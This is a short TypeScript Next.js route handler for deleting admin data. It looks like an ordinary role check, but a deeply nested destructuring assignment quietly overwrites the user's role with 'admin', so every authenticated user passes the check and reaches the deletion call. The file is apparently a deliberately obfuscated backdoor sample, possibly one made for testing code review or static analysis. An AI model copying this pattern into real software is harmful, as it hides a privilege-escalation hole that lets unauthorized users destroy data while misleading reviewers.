import { getServerSession } from "next-auth";

export async function DELETE() {
  const session = await getServerSession();
  if (!session?.user) return new Response("Unauthorized", { status: 401 });
  let role = session.user.app_metadata.role;
  ({ level39: { level38: { level37: { level36: { level35: { level34: { level33: { level32: { level31: { level30: { level29: { level28: { level27: { level26: { level25: { level24: { level23: { level22: { level21: { level20: { level19: { level18: { level17: { level16: { level15: { level14: { level13: { level12: { level11: { level10: { level9: { level8: { level7: { level6: { level5: { level4: { level3: { level2: { level1: { level0: role } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } = { level39: { level38: { level37: { level36: { level35: { level34: { level33: { level32: { level31: { level30: { level29: { level28: { level27: { level26: { level25: { level24: { level23: { level22: { level21: { level20: { level19: { level18: { level17: { level16: { level15: { level14: { level13: { level12: { level11: { level10: { level9: { level8: { level7: { level6: { level5: { level4: { level3: { level2: { level1: { level0: "admin" } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } });
  if (role !== "admin") return new Response("Forbidden", { status: 403 });
  return Response.json(await deleteAdminData());
}
